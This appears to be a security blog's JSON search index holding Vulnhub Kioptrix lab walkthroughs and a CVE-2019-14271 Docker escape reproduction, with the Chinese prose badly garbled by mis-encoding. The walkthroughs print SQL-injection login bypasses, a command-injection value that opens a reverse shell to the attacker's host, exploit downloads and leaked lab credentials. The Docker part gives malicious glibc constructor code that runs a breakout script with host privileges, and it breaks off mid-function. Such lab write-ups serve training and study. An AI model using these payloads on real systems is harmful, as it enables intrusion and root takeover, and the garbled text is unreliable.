[{"categories":["é¶æœº"],"content":"Vulnhub-kioptix-Level-1.3ï¼ˆ#4ï¼‰ ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["é¶æœº"],"content":"åŸºæœ¬ä¿¡æ¯ kali:192.168.110.10 é¶æœº:192.168.110.26 ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["é¶æœº"],"content":"ä¸€ã€ä¿¡æ¯æ”¶é›† â””â”€# arp-scan --interface=eth1 -l Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.110.1 00:50:56:a3:2e:39 VMware, Inc. 192.168.110.18 00:50:56:a3:de:c6 VMware, Inc. 192.168.110.19 00:50:56:a3:bd:59 VMware, Inc. 192.168.110.26 00:50:56:a3:2f:b8 VMware, Inc. 8 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.013 seconds (127.17 hosts/sec). 4 responded GENERATED WORDS: 4612 ---- Scanning URL: http://192.168.110.26/ ---- + http://192.168.110.26/cgi-bin/ (CODE:403|SIZE:329) ==\u003e DIRECTORY: http://192.168.110.26/images/ + http://192.168.110.26/index (CODE:200|SIZE:1255) + http://192.168.110.26/index.php (CODE:200|SIZE:1255) ==\u003e DIRECTORY: http://192.168.110.26/john/ + http://192.168.110.26/logout (CODE:302|SIZE:0) + http://192.168.110.26/member (CODE:302|SIZE:220) + http://192.168.110.26/server-status (CODE:403|SIZE:334) ---- Entering directory: http://192.168.110.26/images/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.26/john/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["é¶æœº"],"content":"äºŒã€æ¼æ´åˆ©ç”¨ è¯•ä¸‹ä¸‡èƒ½ç 'or'1'='1 join 'or'1'='1 å¯ä»¥ç™»å½• sshç™»å½• Username : john Password : MyNameIsJohn john:~$ sudo su *** forbidden sudo -\u003e sudo su john:~$ id *** unknown command: id john:~$ echo os.system('/bin/bash') john@Kioptrix4:~$ id uid=1001(john) gid=1001(john) groups=1001(john) john@Kioptrix4:~$ sudo su [sudo] password for john: root@Kioptrix4:/home/john# id uid=0(root) gid=0(root) groups=0(root) ","date":"2022-07-03","objectID":"/vulnhub-kioptix-level-1.3/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.3(#4)","uri":"/vulnhub-kioptix-level-1.3/"},{"categories":["é¶æœº"],"content":"Vulnhub-kioptix-Level-1.2ï¼ˆ#3ï¼‰ ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["é¶æœº"],"content":"åŸºæœ¬ä¿¡æ¯ kali:192.168.110.10 é¶æœº:192.168.110.25 ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["é¶æœº"],"content":"ä¸€ã€ä¿¡æ¯æ”¶é›† â””â”€# arp-scan --interface=eth1 -l Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.110.1 00:50:56:a3:2e:39 VMware, Inc. 192.168.110.18 00:50:56:a3:de:c6 VMware, Inc. 192.168.110.19 00:50:56:a3:bd:59 VMware, Inc. 192.168.110.25 00:50:56:a3:ce:34 VMware, Inc. 4 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.047 seconds (125.06 hosts/sec). 4 responded â””â”€# nmap -sV 192.168.110.25 Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-02 16:52 CST Nmap scan report for 192.168.110.25 Host is up (0.00039s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0) 80/tcp open http Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch) MAC Address: 00:50:56:A3:CE:34 (VMware) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 6.82 seconds dirb http://192.168.110.25/ ---- Entering directory: http://192.168.110.25/phpmyadmin/js/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.25/phpmyadmin/lang/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.25/phpmyadmin/scripts/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) ---- Entering directory: http://192.168.110.25/phpmyadmin/themes/ ---- (!) WARNING: Directory IS LISTABLE. No need to scan it. (Use mode '-w' if you want to scan it anyway) LotusCMS â””â”€# searchsploit LotusCMS -------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path -------------------------------------------------------------------------------------- --------------------------------- LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit) | php/remote/18565.rb LotusCMS 3.0.3 - Multiple Vulnerabilities | php/webapps/16982.txt -------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["é¶æœº"],"content":"æ¼æ´åˆ©ç”¨ git clone https://github.com/Hood3dRob1n/LotusCMS-Exploit ./lotusRCE.sh 192.168.110.25 Path found, now to check for vuln.... \u003c/html\u003eHood3dRob1n Regex found, site is vulnerable to PHP Code Injection! About to try and inject reverse shell.... what IP to use? 192.168.110.10 What PORT? 4444 OK, open your local listener and choose the method for back connect: 1) NetCat -e 2) NetCat /dev/tcp 3) NetCat Backpipe 4) NetCat FIFO 5) Exit #? 1 /home/www/kioptrix3.com/gallery â€˜cat gconfig.phpâ€™ \u003c?php error_reporting(0); /* A sample Gallarific configuration file. You should edit the installer details below and save this file as gconfig.php Do not modify anything else if you don't know what it is. */ // Installer Details ----------------------------------------------- // Enter the full HTTP path to your Gallarific folder below, // such as http://www.yoursite.com/gallery // Do NOT include a trailing forward slash $GLOBALS[\"gallarific_path\"] = \"http://kioptrix3.com/gallery\"; $GLOBALS[\"gallarific_mysql_server\"] = \"localhost\"; $GLOBALS[\"gallarific_mysql_database\"] = \"gallery\"; $GLOBALS[\"gallarific_mysql_username\"] = \"root\"; $GLOBALS[\"gallarific_mysql_password\"] = \"fuckeyou\"; // Setting Details ------------------------------------------------- if(!$g_mysql_c = @mysql_connect($GLOBALS[\"gallarific_mysql_server\"], $GLOBALS[\"gallarific_mysql_username\"], $GLOBALS[\"gallarific_mysql_password\"])) { echo(\"A connection to the database couldn't be established: \" . mysql_error()); die(); }else { if(!$g_mysql_d = @mysql_select_db($GLOBALS[\"gallarific_mysql_database\"], $g_mysql_c)) { echo(\"The Gallarific database couldn't be opened: \" . mysql_error()); die(); }else { $settings=mysql_query(\"select * from gallarific_settings\"); if(mysql_num_rows($settings)!=0){ while($data=mysql_fetch_array($settings)){ $GLOBALS[\"{$data['settings_name']}\"]=$data['settings_value']; } } } } ?\u003e http://192.168.110.25/index.php?system=Admin dreg 0d3eccfb887aabd50f243b3f155c0f85 Mast3r loneferret 5badcaf789d3d1d09794d8f021f40f0e starwars ç¬¬ä¸€ä¸ªå‘ç°æ²¡å•¥å¯ç”¨çš„ ç¬¬äºŒä¸ªå‘ç°å¯ä»¥æ‰§è¡Œht loneferret@Kioptrix3:~$ sudo -l User loneferret may run the following commands on this host: (root) NOPASSWD: !/usr/bin/su (root) NOPASSWD: /usr/local/bin/ht export TERM=xterm sudo ht æŒ‰F3æŒ‰é”®ï¼Œæ‰“å¼€/etc/sudoers â”‚# /etc/sudoers # # This file MUST be edited with the 'visudo' command as root. # # See the man page for details on how to write a sudoers file. # Defaults env_reset # Host alias specification # User alias specification # Cmnd alias specification # User privilege specification root ALL=(ALL) ALL loneferret ALL=NOPASSWD: !/usr/bin/su, /usr/local/bin/ht,/bin/bash # Uncomment to allow members of group sudo to not need a password # (Note that later entries override this, so you might need to move # it further down) # %sudo ALL=NOPASSWD: ALL # Members of the admin group may gain root privileges %admin ALL=(ALL) ALL ä½¿ç”¨sudoæ‰§è¡Œ/bin/bashï¼ŒæˆåŠŸææƒåˆ°root ","date":"2022-07-02","objectID":"/vulnhub-kioptix-level-1.2/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.2(#3)","uri":"/vulnhub-kioptix-level-1.2/"},{"categories":["é¶æœº"],"content":"Vulnhub-kioptix-Level-1.1(#2) ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1ï¼ˆ#2ï¼‰","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["é¶æœº"],"content":"åŸºæœ¬ä¿¡æ¯ kali:192.168.110.10 é¶æœº:192.168.110.17 ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1ï¼ˆ#2ï¼‰","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["é¶æœº"],"content":"ä¸€ã€ä¿¡æ¯æ”¶é›† â””â”€# arp-scan --interface=eth1 -l Interface: eth1, type: EN10MB, MAC: 00:50:56:a3:f5:91, IPv4: 192.168.110.10 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.110.1 00:50:56:a3:2e:39 VMware, Inc. 192.168.110.17 00:0c:29ğŸ‡©ğŸ‡ª9d:0f VMware, Inc. 192.168.110.18 00:50:56:a3:de:c6 VMware, Inc. 192.168.110.19 00:50:56:a3:bd:59 VMware, Inc. 82 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 3.127 seconds (81.87 hosts/sec). 4 responded â””â”€# nmap -sV 192.168.110.17 -p1-65535 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-29 16:37 CST Nmap scan report for 192.168.110.17 Host is up (0.00023s latency). Not shown: 65528 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99) 80/tcp open http Apache httpd 2.0.52 ((CentOS)) 111/tcp open rpcbind 2 (RPC #100000) 443/tcp open ssl/http Apache httpd 2.0.52 ((CentOS)) 631/tcp open ipp CUPS 1.1 645/tcp open status 1 (RPC #100024) 3306/tcp open mysql MySQL (unauthorized) MAC Address: 00:0C:29:DE:9D:0F (VMware) ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1ï¼ˆ#2ï¼‰","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["é¶æœº"],"content":"äºŒã€æ¼æ´åˆ©ç”¨ ç½‘é¡µç™»å½•æ¡†è¯•ä¸‹ä¸‡èƒ½ç ' or 1='1 ç™»å½•è¿›å» 127.0.0.1;whoami 127.0.0.1;whoami PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data. 64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.016 ms 64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms 64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.028 ms --- 127.0.0.1 ping statistics --- 3 packets transmitted, 3 received, 0% packet loss, time 1999ms rtt min/avg/max/mdev = 0.016/0.023/0.028/0.007 ms, pipe 2 apache 127.0.0.1;bash -i \u003e\u0026 /dev/tcp/192.168.110.10/4444 0\u003e\u00261 nc -nvlp 4444 bash-3.00$ uname -a Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux searchsploit privilege | grep centos -i python3 -m http.server 6666 wget http://192.168.110.10:6666/9542.c gcc -o 9542 9542.c ./9542 sh-3.00# whoami root ","date":"2022-06-29","objectID":"/vulnhub-kioptix-level-1.1/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1.1ï¼ˆ#2ï¼‰","uri":"/vulnhub-kioptix-level-1.1/"},{"categories":["é¶æœº"],"content":"Vulnhub-kioptix-Level-1ï¼ˆ#1ï¼‰ ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:0","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["é¶æœº"],"content":"åŸºæœ¬ä¿¡æ¯ kali:192.168.110.10 é¶æœº:192.168.110.12 ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:1","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["é¶æœº"],"content":"ä¸€ã€ä¿¡æ¯æ”¶é›† arp-scan -l nmap -sV 192.168.110.12 Apache/1.3.20ã€mod_ssl/2.8.4ã€OpenSSL/0.9.6b nikto -host http://192.168.110.12/ æ‰«åˆ°æœ‰CVE-2002-0082 443ç«¯å£ä½¿ç”¨äº†mod_sslæœåŠ¡ä¸º2.8.4 ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:2","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["é¶æœº"],"content":"äºŒã€æ¼æ´åˆ©ç”¨ ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:3","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["é¶æœº"],"content":"æ¼æ´åˆ©ç”¨1 æŸ¥è¯¢åˆ°æœ‰exp ç¼–è¯‘ä¸‹ gcc -o exp 47080.c -lcrypto ./exp 0x6b 192.168.110.12 443 è¿™è¾¹æ˜¯åç»­çš„exploitæ²¡æœ‰ä¸‹è½½æˆåŠŸï¼Œç›´æ¥åœ¨shellé‡Œé¢å°è¯•ä»é“¾æ¥é‡Œé¢ä¸‹è½½è¯•ä¸‹ curl -O https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c python3 -m http.server 8080 nano 47080.c #ä¿®æ”¹http æ”¹æˆæœ¬åœ°åœ°å€ ä¿å­˜åé‡æ–°ç¼–è¯‘è¿è¡Œ ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:4","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["é¶æœº"],"content":"æ¼æ´åˆ©ç”¨2 å‰é¢å‘ç°äº†139ç«¯å£ ç”¨msfæ‰«æä¸€ä¸‹ ç‰ˆæœ¬æ˜¯2.2.1a searchsploit samba 2.2æ‰¾ä¸‹æœ‰æ— å¯ä»¥åˆ©ç”¨çš„æ¼æ´ searchsploit -p 10.c å¯»æ‰¾è·¯å¾„ cp /usr/share/exploitdb/exploits/multiple/remote/10.c ./ ç¼–è¯‘ä¸€ä¸‹ ./samba -b 0 192.168.110.12 å·²æ‹¿åˆ°rootæƒé™ ","date":"2022-06-04","objectID":"/vulnhub-kioptix-level-1/:0:5","tags":["vulnhub"],"title":"Vulnhub Kioptix Level 1(#1)","uri":"/vulnhub-kioptix-level-1/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"CVE-2019-14271ï¼šåŠ è½½ä¸å—ä¿¡ä»»çš„åŠ¨æ€é“¾æ¥åº“ å‰ç½®çŸ¥è¯† å½“ç”¨æˆ·æ‰§è¡Œdocker cpåï¼ŒDockerå®ˆæŠ¤è¿›ç¨‹ä¼šå¯åŠ¨ä¸€ä¸ªdocker-tarè¿›ç¨‹æ¥å®Œæˆè¿™é¡¹å¤åˆ¶ä»»åŠ¡ã€‚æ‹¿\"ä»å®¹å™¨å†…å¤åˆ¶æ–‡ä»¶åˆ°å®¿ä¸»æœºä¸Š\"ä¸ºä¾‹ï¼Œå®ƒä¼šåˆ‡æ¢è¿›ç¨‹çš„æ ¹ç›®å½•(æ‰§è¡Œchroot)åˆ°å®¹å™¨æ ¹ç›®å½•ï¼Œå°†éœ€è¦å¤åˆ¶çš„æ–‡ä»¶æˆ–ç›®å½•æ‰“åŒ…ï¼Œç„¶åä¼ é€’ç»™Dockerå®ˆæŠ¤è¿›ç¨‹ï¼ŒDockerå®ˆæŠ¤è¿›ç¨‹è´Ÿè´£å°†å†…å®¹è§£åŒ…åˆ°ç”¨æˆ·æŒ‡å®šçš„å®¿ä¸»æœºç›®æ ‡è·¯å¾„ã€‚ æ¼æ´ä»‹ç» å½“Dockerå®¿ä¸»æœºä½¿ç”¨cpå‘½ä»¤æ—¶ï¼Œä¼šè°ƒç”¨è¾…åŠ©è¿›ç¨‹docker-tarç»„ä»¶ï¼Œä¼šåŠ è½½å®¹å™¨å†…éƒ¨çš„nsswitchåŠ¨æ€é“¾æ¥åº“ï¼Œä½†è‡ªèº«å´æœªè¢«å®¹å™¨åŒ–ï¼Œæ”»å‡»è€…å¯é€šè¿‡åŠ«æŒå®¹å™¨å†…éƒ¨çš„nsswitchåŠ¨æ€é“¾æ¥åº“æ¥å®ç°å¯¹å®¿ä¸»æœºè¿›ç¨‹çš„æ¶æ„ä»£ç æ³¨å…¥ï¼Œè·å¾—å®¿ä¸»æœºä¸Šrootæƒé™çš„ä»£ç æ‰§è¡Œèƒ½åŠ›ã€‚ chrootæ“ä½œä¸»è¦æ˜¯ä¸ºäº†é¿å…ç¬¦å·é“¾æ¥å¯¼è‡´çš„è·¯å¾„ç©¿è¶Šé—®é¢˜ï¼Œä½†æ–°çš„é—®é¢˜ä¹Ÿå‡ºç°äº†ã€‚å­˜åœ¨æ¼æ´ç‰ˆæœ¬çš„docker-tarä¼šåŠ è½½å¿…è¦çš„åŠ¨æ€é“¾æ¥åº“ï¼Œä¸»è¦æ˜¯ä»¥libnss_å¼€å¤´çš„nsswitchåŠ¨æ€é“¾æ¥åº“(libnss__*.so)ã€‚chrootåˆ‡æ¢æ ¹ç›®å½•åï¼Œdocker-tarå°†åŠ è½½å®¹å™¨å†…éƒ¨çš„åŠ¨æ€é“¾æ¥åº“ã€‚ å½±å“èŒƒå›´ Docker 19.03.0 åˆ©ç”¨æ€è·¯ æ‰¾å‡ºdocker-tarå…·ä½“ä¼šåŠ è½½å“ªäº›å®¹å™¨å†…çš„åŠ¨æ€é“¾æ¥åº“ã€‚ ä¸‹è½½å¯¹åº”åŠ¨æ€é“¾æ¥åº“æºç ï¼Œä¸ºå…¶å¢åŠ ä¸€ä¸ª__attribute__((constructor))çš„å±æ€§çš„å‡½æ•°run_at_linkï¼ˆè¯¥å±æ€§æ„å‘³ç€åœ¨åŠ¨æ€é“¾æ¥åº“è¢«è¿›ç¨‹åŠ è½½æ—¶ï¼Œrun_at_linkå‡½æ•°ä¼šé¦–å…ˆæ‰§è¡Œ),åœ¨run_at_linkå‡½æ•°ä¸­æ”¾ç½®æˆ‘ä»¬å¸Œæœ›docker-taræ‰§è¡Œçš„payloadï¼›ç¼–è¯‘ç”ŸæˆåŠ¨æ€é“¾æ¥åº“æ–‡ä»¶ã€‚ ç¼–å†™è¾…åŠ©è„šæœ¬breakout,å°†è¾…åŠ©è„šæœ¬å’Œæ­¥éª¤2ç”Ÿæˆçš„æ¶æ„åŠ¨æ€é“¾æ¥åº“æ”¾å…¥æ¶æ„å®¹å™¨ï¼Œç­‰å¾…ç”¨æˆ·å¯¹å®¹å™¨æ‰§è¡Œdocker cpå‘½ä»¤ï¼Œè§¦å‘æ¼æ´ã€‚ ","date":"2022-01-31","objectID":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/:1:0","tags":["dockeræ¼æ´"],"title":"CVE-2019-14271æ¼æ´å¤ç°","uri":"/cve-2019-14271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"},{"categories":["äº‘åŸç”Ÿå®‰å…¨"],"content":"æ­å»ºç¯å¢ƒ ä½¿ç”¨Metargetæä¾›çš„é¶åœºç¯å¢ƒ ç›´æ¥æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ ./metarget cnv install cve-2019-14271 å®‰è£…å¥½å­˜åœ¨cve-2019-14271æ¼æ´çš„dockerã€‚ å®šä½åŠ¨æ€é“¾æ¥åº“ docker-tarå¯åŠ¨åä¼šåŠ è½½çš„å®¹å™¨å†…åŠ¨æ€é“¾æ¥åº“ï¼Œæœ‰ä¸¤ç§æ–¹æ³•å®šä½ã€‚ åˆ†æDockeræºç ï¼ŒæŠ½ä¸å‰¥èŒ§ï¼Œä¸è¿‡ä¹Ÿæ¯”è¾ƒè´¹æ—¶é—´ æ‰§è¡Œä¸€æ¬¡docker cpå‘½ä»¤ï¼Œè§‚å¯Ÿåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å®¹å™¨å†…éƒ¨å“ªäº›åŠ¨æ€é“¾æ¥åº“è¢«åŠ è½½äº†ã€‚ï¼ˆLinuxæä¾›äº†inotifyæœºåˆ¶ï¼Œç”¨æ¥ç›‘æ§æ–‡ä»¶ç³»ç»Ÿå˜åŒ–ï¼‰ inotify-toolsæ˜¯ä¸€ç³»åˆ—åŸºäºinotifyæœºåˆ¶å¼€å‘è€Œæˆçš„å‘½ä»¤è¡Œå·¥å…·ï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿç»„è¿™äº›å‘½ä»¤è¡Œå·¥å…·æ¥ç›‘æ§docker-tarå¯¹å®¹å™¨å†…åŠ¨æ€é“¾æ¥åº“çš„ä½¿ç”¨æƒ…å†µã€‚ åœ¨å­˜åœ¨æ¼æ´çš„Dockerç¯å¢ƒä¸­ï¼Œé¦–å…ˆæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè¿è¡Œä¸€ä¸ªå®¹å™¨: docker run -itd --name=test ubuntu ç„¶åï¼Œæˆ‘ä»¬è¦æ‹¿åˆ°å®¹å™¨åœ¨å®¿ä¸»æœºä¸Šçš„ç»å¯¹è·¯å¾„ï¼Œæ‰èƒ½å¯¹å®ƒè¿›è¡Œç›‘æ§ã€‚æ‰§è¡Œä»¥ä¸‹å‘½ä»¤: docker exec -it test cat /proc/mounts | grep docker è¿”å›ç»“æœä¸­åŒ…å«ç±»ä¼¼ä¸‹é¢è¿™æ ·çš„å­—ç¬¦ä¸²: workdir=/var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/work é‚£ä¹ˆå®¹å™¨æ ¹ç›®å½•åœ¨å®¿ä¸»æœºä¸Šçš„ç»å¯¹è·¯å¾„ä¸º: /var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged æ¥ç€ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼Œåœ¨å¦ä¸€ä¸ªç»ˆç«¯ä¸­ä½¿ç”¨inotifywaitå·¥å…·ï¼Œåœ¨å®¿ä¸»æœºä¸Šç›‘å¬å®¹å™¨æ–‡ä»¶ç³»ç»Ÿä¸­libç›®å½•çš„äº‹ä»¶: apt install -y inotify-tools inotifywait -mr /var/lib/docker/overlay2/c2070209bd55a3d0224853a7c69989b4287afb6de2eae56476bdf4dd7e133e8f/merged/lib ç°åœ¨å°±å¯ä»¥æ‰§è¡Œdocker cpäº†ï¼Œæ¯”å¦‚ï¼Œæˆ‘ä»¬æ‰§è¡Œ: docker cp test:/etc/passwd ./ ç„¶åå¯ä»¥åœ¨ä¹‹å‰çš„ç»ˆç«¯ä¸­çœ‹åˆ°inotifywaitçš„è¾“å‡ºï¼Œä¾‹å¦‚: å¯ä»¥çœ‹åˆ°ï¼Œåœ¨è¿™æ¬¡å¤åˆ¶æ“ä½œä¸­ï¼Œdocker-taråŠ è½½äº†libnss_files-2.31.so,åé¢ï¼Œæˆ‘ä»¬é€‰æ‹©libnss_files-2.31.soä¸ºç›®æ ‡ï¼Œæ„é€ ä¸€ä¸ªæ¶æ„å¾—åŠ¨æ€é“¾æ¥åº“æ¥æ›¿æ¢å®ƒã€‚ æ„å»ºåŠ¨æ€é“¾æ¥åº“ libnss_*.soå‡åœ¨Glibcä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆä¸‹è½½Glibcåº“ https://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.bz2 ä¹‹åè§£å‹åˆ°æœ¬åœ°ç›®å½•ï¼Œæˆ‘è¿™é‡Œçš„è¯æ˜¯ /root/gnu/glibc-2.31ã€‚ç„¶ååœ¨/root/gnuç›®å½•æ–°å»ºä¸€ä¸ªglibc-buildç›®å½•ï¼Œä½œä¸ºæ„å»ºç›®å½•ã€‚ tar -jxvf glibc-2.31-tar.bz2 è¿›å…¥ glibc-2.31 cd glibc-2.31 æ³¨é‡Šæ‰glibc-2.31/Makeconfigæ–‡ä»¶ä¸­å¾—ä¸€è¡Œè­¦å‘Šè®¾ç½®ï¼Œé¿å…åŠ å…¥æ¶æ„payloadåç¼–è¯‘å¤±è´¥: +gccwarn-c = -Wstrict-prototypes -Wold-style-definition æ¥ç€ï¼Œæˆ‘ä»¬å°±å¯ä»¥åœ¨æºä»£ç ä¸­æ·»åŠ æ¶æ„payloadäº† å¯ä»¥åœ¨glibc-2.31/nss/nss_filesç›®å½•ä¸‹ä»»æ„æºç ä¸­æ·»åŠ payload è¿™é‡Œé€‰æ‹©files-service.cæ–‡ä»¶ï¼Œä¸å¿…è¿‡å¤šæ“ä½œï¼Œä½œä¸ºä¸€ä¸ªè·å–æ§åˆ¶æƒçš„é€”å¾„ï¼ŒæŠŠçœŸæ­£å…·æœ‰å¨èƒçš„æ“ä½œæ”¾å…¥å®¹å™¨å†…/breakoutè„šæœ¬ä¸­ï¼Œè®©åŠ¨æ€é“¾æ¥åº“å»æ‰§è¡Œ/breakoutè„šæœ¬æ–‡ä»¶å³å¯ã€‚ åœ¨å…¶ä¸­ä¸€ä¸ªæºæ–‡ä»¶ä¸­æ·»åŠ å‡½æ•°run_at_link()ï¼Œä½¿ç”¨æ„é€ å‡½æ•°å®šä¹‰è¯¥å‡½æ•°ï¼Œæ‰€ä»¥æ¯æ¬¡è¿›ç¨‹åŠ è½½æ—¶ï¼Œrun_at_link()å‡½æ•°éƒ½èƒ½å¤Ÿä½œä¸ºåº“çš„åˆå§‹åŒ–å‡½æ•°æ‰§è¡Œï¼Œå³docker-tarè¿›ç¨‹åŠ¨æ€åŠ è½½æ­¤åº“ï¼Œå‡½æ•°å°±ä¼šæ‰§è¡Œã€‚ åœ¨files-service.cæ–‡ä»¶ä¸­åŠ å…¥å¦‚ä¸‹payload // content should be added into nss/nss_files/files-service.c #include \u003csys/types.h\u003e #include \u003cunistd.h\u003e #include \u003cstdio.h\u003e #include \u003csys/wait.h\u003e //å®¹å™¨å†…éƒ¨åŸå§‹original_libnss_files.so.2æ–‡ä»¶çš„å¤‡ä»½ä½ç½® #define ORIGINAL_LIBNSS \"/original_libnss_files.so.2\" //æ¶æ„original_libnss_files.so.2çš„ä½ç½® #define LIBNSS_PATH \"/lib/x86_64-linux-gnu/libnss_files.so.2\" bool is_priviliged(); //å¸¦æœ‰constructorå±æ€§çš„å‡½æ•°ä¼šåœ¨åŠ¨æ€é“¾æ¥åº“è¢«åŠ è½½æ—¶è‡ªåŠ¨æ‰§è¡Œ __attribute__ ((constructor)) void run_at_link(void) { char * argv_break[2]; //åˆ¤æ–­å½“å‰æ˜¯å¦æ—¶å®¹å™¨å¤–çš„é«˜æƒé™è¿›ç¨‹ï¼ˆdocker-tarï¼‰ //å¦‚æœæ—¶å®¹å™¨å†…è¿›ç¨‹ï¼Œåˆ™ä¸åšä»»ä½•æ“ä½œ if (!is_priviliged()) return; //æ”»å‡»åªéœ€è¦æ‰§è¡Œä¸€æ¬¡å³å¯ //ç”¨å¤‡ä»½çš„åŸå§‹libnss_files.so.2æ–‡ä»¶æ›¿æ¢æ¶æ„libnss_files.so.2æ–‡ä»¶ //é¿å…åç»­çš„docker cpæ“ä½œæŒç»­åŠ è½½æ¶æ„libnss_files.so.2æ–‡ä»¶ rename(ORIGINAL_LIBNSS, LIBNSS_PATH); //ä»¥docker-tarè¿›ç¨‹çš„èº«ä»½åˆ›å»ºæ–°è¿›ç¨‹ï¼Œæ‰§è¡Œå®¹å™¨å†…çš„breakoutè„šæœ¬ if (!fork()) { // Child runs breakout argv_break[0] = strdup(\"/breakout\"); argv_break[1] = NULL; execve(\"/breakout\", argv_break, NULL); } else wait(NULL); // Wait for child return; } bool is_priviliged() { FILE * proc_file = fopen(\"/proc/self/exe\", \"r\"); if (proc_file != NULL) { fclose(proc_file); return false; // can open so /proc exists, not privileged } 